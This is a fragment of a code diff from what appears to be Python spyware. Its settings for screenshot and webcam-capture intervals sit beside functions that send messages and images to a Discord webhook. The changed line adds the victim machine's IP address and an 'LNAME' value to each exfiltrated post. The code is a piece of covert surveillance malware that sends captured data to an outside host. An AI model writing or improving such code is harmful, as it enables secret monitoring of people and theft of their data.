@@ -25,7 +25,7 @@ screenshot_delay = 10 #screenshot_delay
 camshot_delay = 10.25 #camshot_delay
 
 def send(message,target) -> None:
-    sendall = DiscordWebhook(url=target, content=message, username=socket.gethostbyname(socket.gethostname()))
+    sendall = DiscordWebhook(url=target, content=message, username=socket.gethostbyname(socket.gethostname()) + " " + LNAME)
     sendall.execute()
 
 def send_image_to_discord1(image_file, url):
